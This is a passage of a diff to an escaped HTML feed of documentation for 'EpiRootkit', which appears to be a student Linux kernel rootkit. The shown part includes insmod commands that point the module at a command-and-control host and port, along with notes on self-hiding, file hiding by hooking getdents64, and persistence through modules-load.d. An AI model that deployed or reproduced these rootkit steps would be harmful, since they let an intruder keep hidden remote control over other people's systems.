 sudo ./deploy_rootkit.sh uninstall
@@ -1436,18 +1208,18 @@ sudo ./deploy_rootkit.sh uninstall
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="7e16c96" class="language-bash ">
- &lt;code># Load with domain
-sudo insmod epirootkit.ko address=jules-c2.example.com
+ &lt;pre id="5967864" class="language-bash ">
+ &lt;code># Load with domain 
+sudo insmod epirootkit.ko address=c2.example.com
 
-# Load with IP
+# Load with IP and port
 sudo insmod epirootkit.ko address=192.168.200.11 port=4444
 
-# Load with defaults from config.h
+# Load with defaults from config
 sudo insmod epirootkit.ko&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;h2 id="self-cleanup-features">Self-Cleanup Features &lt;a href="#self-cleanup-features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>The deployment script includes stealth capabilities:&lt;/p></description></item><item><title>Connection &amp; Authentication</title><link>/docs/05-epirootkit/connection-authentication/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/05-epirootkit/connection-authentication/</guid><description>&lt;h2 id="connection-process">Connection Process &lt;a href="#connection-process" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>When the rootkit loads, it automatically:&lt;/p>
+&lt;h2 id="module-status-detection">Module Status Detection &lt;a href="#module-status-detection" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>The deployment script can detect module status even when hidden:&lt;/p></description></item><item><title>Connection &amp; Authentication</title><link>/docs/05-epirootkit/connection-authentication/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/05-epirootkit/connection-authentication/</guid><description>&lt;h2 id="connection-process">Connection Process &lt;a href="#connection-process" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>When the rootkit loads, it automatically:&lt;/p>
 &lt;ol>
 &lt;li>&lt;strong>Starts connection thread&lt;/strong> (&lt;code>epirootkit_conn&lt;/code>)&lt;/li>
 &lt;li>&lt;strong>Resolves domain&lt;/strong> (if address is domain name) - see &lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/05-epirootkit/features/dns-resolution/'>&lt;p>FEATURES&lt;/p>&lt;strong>DNS Resolution&lt;/strong>&lt;br>Kernel-space DNS client for domain-based C2 communication&lt;/a>" data-bs-toggle="tooltip" href="/docs/05-epirootkit/features/dns-resolution/">DNS Resolution&lt;/a>&lt;/li>
@@ -1790,7 +1562,16 @@ cat /sys/kernel/epirootkit/control # Apply&lt;/code>
  warning
  &lt;/span>&lt;/div>
  
- &lt;div class="w-100">&lt;p>The &lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/05-epirootkit/features/line-hiding/'>&lt;p>FEATURES&lt;/p>&lt;strong>Line Hiding&lt;/strong>&lt;br>Hide rootkit lines from file contents using syscall interception&lt;/a>" data-bs-toggle="tooltip" href="/docs/05-epirootkit/features/line-hiding/">Line Hiding&lt;/a> also hides the module from &lt;code>/proc/modules&lt;/code> so to test module visibility with lsmod, you must disable line hiding.&lt;/p></description></item><item><title>File Hiding</title><link>/docs/05-epirootkit/features/file-hiding/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/file-hiding/</guid><description>&lt;h2 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+ &lt;div class="w-100">&lt;p>The &lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/05-epirootkit/features/line-hiding/'>&lt;p>FEATURES&lt;/p>&lt;strong>Line Hiding&lt;/strong>&lt;br>Hide rootkit lines from file contents using syscall interception&lt;/a>" data-bs-toggle="tooltip" href="/docs/05-epirootkit/features/line-hiding/">Line Hiding&lt;/a> also hides the module from &lt;code>/proc/modules&lt;/code> so to test module visibility with lsmod, you must disable line hiding.&lt;/p></description></item><item><title>File Hiding</title><link>/docs/05-epirootkit/features/file-hiding/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/file-hiding/</guid><description>&lt;div class="alert alert-warning d-flex" role="alert">
+ &lt;div class="flex-shrink-1 alert-icon">
+ 
+ &lt;span class="material-icons size-20 me-2">
+ warning
+ &lt;/span>&lt;/div>
+ 
+ &lt;div class="w-100">It&amp;rsquo;s Tuesday 17/06 21:26, two hours before deadline, and I&amp;rsquo;m realizing just now that even with file hiding enabled, the directory &lt;code>/sys/module/epirootkit&lt;/code> is still visible in the victim&amp;rsquo;s system. This occurs because we only hook getdents while &lt;code>/sys/module/epirootkit&lt;/code> uses sysfs.&lt;/div>
+ &lt;/div>
+&lt;h2 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
 
 
  
@@ -1820,36 +1601,7 @@ file_hiding_state.getdents_probe = (struct kretprobe) {
 };&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;p>Hooks &lt;code>ksys_getdents64&lt;/code> syscall and filters directory entries matching hidden prefixes.&lt;/p>
-&lt;h2 id="testing">Testing &lt;a href="#testing" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="13bf479" class="language-bash ">
- &lt;code># Create test files
-touch /tmp/epirootkit_test.txt /tmp/normal_file.txt
-
-# Without file hiding
-ls /tmp/
-# Output: epirootkit_test.txt normal_file.txt
-
-# With file hiding enabled
-ls /tmp/
-# Output: normal_file.txt&lt;/code>
- &lt;/pre>
- &lt;/div>
-&lt;h2 id="control">Control &lt;a href="#control" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="webui">WebUI &lt;a href="#webui" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Toggle via &lt;strong>&lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/04-web-ui/features/panels/configuration-panel/'>&lt;p>UI PANELS&lt;/p></description></item><item><title>Persistence</title><link>/docs/05-epirootkit/features/persistence/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/persistence/</guid><description>&lt;h2 id="modules-loadd-method">modules-load.d Method &lt;a href="#modules-loadd-method" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Modules are&lt;/p>
+&lt;p>Hooks &lt;code>ksys_getdents64&lt;/code> syscall and filters directory entries matching hidden prefixes.&lt;/p></description></item><item><title>Persistence</title><link>/docs/05-epirootkit/features/persistence/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/persistence/</guid><description>&lt;h2 id="modules-loadd-method">modules-load.d Method &lt;a href="#modules-loadd-method" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Modules are&lt;/p>
 &lt;p>Creates two files:&lt;/p>
 &lt;p>&lt;strong>&lt;code>/etc/modules-load.d/jules_est_bo_system.conf&lt;/code>&lt;/strong>:&lt;/p>
 
